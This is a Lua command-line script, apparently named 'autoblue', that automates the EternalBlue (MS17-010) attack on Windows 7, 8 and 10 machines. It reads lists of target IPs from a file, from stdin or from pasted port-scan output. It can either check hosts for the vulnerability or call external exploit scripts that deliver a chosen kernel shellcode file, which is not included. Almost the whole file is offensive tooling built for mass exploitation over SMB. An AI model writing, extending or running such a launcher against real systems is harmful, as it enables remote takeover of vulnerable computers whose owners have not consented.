#!/usr/bin/env lua5.3

local Args = {...}

local Help = {
	"Usage: autoblue.lua [-h/-f <file>/-s (default)/-x/-S <shellcode>/-v <7/8/10>]",
	"Example: ./autoblue.lua -f ips.txt -x -S sc_x64_kernel",
	"Use shellcode/shell_prep.sh to compile shellcodes."
}

local continue = 0

local function printf(text, ...)
	return io.write(text:format(...))
end

local ScanMode = true

local function IsIPv4(IP)
	if IP:match("^[^%d%.]") then
		return false
	end
	local Octets = {IP:match("(%d+)%.(%d+)%.(%d+)%.(%d+)")}
	if #Octets ~= 4 then
		return false
	end
	for _, Octet in pairs(Octets) do
		if tonumber(Octet) < 0 or tonumber(Octet) > 255 then
			return false
		end
	end
	return true
end

function string.split(String, Seperator)
	local Table = {}
	Seperator = Seperator or " "
	String = tostring(String)
	for Text in String:gmatch("[^%"..Seperator.."]+") do
		table.insert(Table, Text)
	end
	return Table
end

local IPs = {}
local Shellcode
local Version = "10"

for i, Arg in pairs(Args) do
	if Arg == "-h" or Arg == "--help" then
		for _, Line in pairs(Help) do
			print(Line)
		end
		os.exit(0)
	elseif Arg == "-f" or Arg == "--file" then
		continue = 1
		local FileName = Args[i + 1] or nil
		if not FileName then
			printf("Please provide a file name after %s.\n", Arg)
			os.exit(1)
		end
		local File, Err = io.open(FileName, "r")
		if not File then
			printf("Error occurred while reading %s.\n", Err)
			os.exit(2)
		end
		IPs = File:read("*all"):split("\n")
		File:close()
		printf("Reading target IPs from %s.\n", FileName)
	elseif Arg == "-s" or Arg == "--scan" then
		ScanMode = true
		print("Scanning.")
	elseif Arg == "-x" or Arg == "--exploit" then
		ScanMode = false
		print("Exploiting.")
	elseif Arg == "-S" or Arg == "--shellcode" then
		continue = 1
		Shellcode = Args[i + 1] or nil
		if not Shellcode then
			printf("Please provide a shellcode (excluding .bin) after %s.\n", Arg)
			os.exit(1)
		end
		local File, Err = io.open("shellcode/"..Shellcode..".bin", "r")
		if not File then
			printf("Error occurred while reading %s.\n", Err)
			os.exit(2)
		end
		File:close()
		printf("Using shellcode %s.\n", Shellcode)
	elseif Arg == "-v" or Arg == "--version" then
		continue = 1
		Version = Args[i + 1] or nil
		if Version ~= "7" and Version ~= "8" and Version ~= "10" then
			printf("Unknown version \"%s\". Use 7, 8 or 10.\n", Version)
			os.exit(1)
		end
		printf("Using windows version %s.\n", Version)
	elseif continue > 0 then
		continue = continue - 1
	else
		printf("Unknown option: %s.\n", Arg)
		os.exit(1)
	end
end

if ScanMode then
	if Shellcode then
		print("Scanning, so shellcode is ignored.")
	end
else
	if not Shellcode then
		print("Shellcode needed for exploiting.")
		os.exit(3)
	end
end

local function Attack(IP)
	if IP:sub(1, 1) ~= "#" then
		if IsIPv4(IP) then
			if ScanMode then
				printf("Checking IP %s.\n", IP)
				os.execute("python eternalblue_checker.py "..IP)
			else
				printf("Exploiting IP %s.\n", IP)
				os.execute("python eternalblue_exploit"..Version..".py "..IP.." shellcode/"..Shellcode..".bin 17")
			end
		else
			printf("IP '%s' is not a valid IPv4 address, skipped!\n", IP)
		end
	end
end

if #IPs > 0 then
	print("Running autoblue on IPs.")

	for _, IP in pairs(IPs) do
		Attack(IP)
	end
else
	print("Running autoblue on IPs from stdin, type an IP to start.")
	print("Type \"exit\" to exit.")
	local Running = true
	local Previous = ""
	while Running do
		io.write("> ")
		local Input = io.read("*l")
		if Input ~= "" then
			if not Input then
				print("Shutting down autoblue.")
				Running = false
			end
			if Input:sub(1, 32) == "Discovered open port 445/tcp on " then
				Input = Input:sub(33)
			end
			if Input == "exit" or Input == "e" or Input == "quit" or Input == "q" then
				Running = false
			elseif IsIPv4(Input) then
				Previous = Input
				Attack(Input)
				print("")
			elseif Input == "!!" or Input == "previous" or Input == "prev" or Input == "p" then
				if Previous then
					Attack(Previous)
					print("")
				end
			else
				printf("Invalid input: %s.\n", Input)
			end
		end
	end
end
